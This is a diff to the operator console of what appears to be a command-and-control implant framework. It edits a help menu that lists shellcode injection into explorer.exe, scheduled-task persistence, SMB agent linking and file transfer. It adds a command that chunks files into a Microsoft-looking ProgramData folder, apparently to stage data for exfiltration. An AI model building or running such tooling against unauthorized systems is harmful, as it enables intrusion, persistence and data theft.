@@ -253,7 +253,9 @@ def send_command_and_get_output(hostname, username, command_mappings, current_sl
             print(" whoami                        :: Display user information (on Windows /all)")
             print(" pwd                           :: Display current working directory")
             print(" hostname                      :: Retrieve the local hostname")
+            print(" ipinfo                        :: Retrieve local interface details")
             print(" nslookup <hostname>           :: Perform a DNS lookup for the given hostname")
+            print(" compress <file_path>          :: Compress a file into <=50MB chunks, stored in C:\\ProgramData\\Microsoft\\chunk")
             print(" download <file_path>          :: Download a file from the asset")
             print(" upload <local_path> <remote_path> :: Upload a file to the asset")
             print(" users <local|dom> <groupname> or <domain\group_name> :: List users in the specified local or domain group")
@@ -267,7 +269,6 @@ def send_command_and_get_output(hostname, username, command_mappings, current_sl
             print(" unlink smb agent <ip_address> :: Unlink the SMB agent from the current host using the specified IP address")
             print(" injectshellcode <file_path>   :: Inject and execute shellcode in explorer.exe")
             print(" inject_memory <local_path>    :: Upload shellcode file and inject it into explorer.exe")
-            print(" kill                          :: Terminate the agent")
             print(" list_scheduled_tasks          :: List all scheduled tasks")
             print(" create_scheduled_task <task_name> <command_line> <trigger_time> [repeat_interval] [repeat_duration] :: Create a scheduled task")
             print(" delete_scheduled_task <task_name> :: Delete a scheduled task")
@@ -381,6 +382,14 @@ def send_command_and_get_output(hostname, username, command_mappings, current_sl
                 continue
             else:
                 command_text = f"mkdir {parts[1]}"
+
+        elif command_text.startswith('compress'):
+            parts = command_text.split(maxsplit=1)
+            if len(parts) == 1:
+                print(f"{RED}Error:{RESET} Invalid compress command format. Use 'compress <file_path>'.")
+                continue
+            else:
+                command_text = f"compress {parts[1]}"
 
         elif command_text.startswith("cat"):
             parts = command_text.split(maxsplit=1)
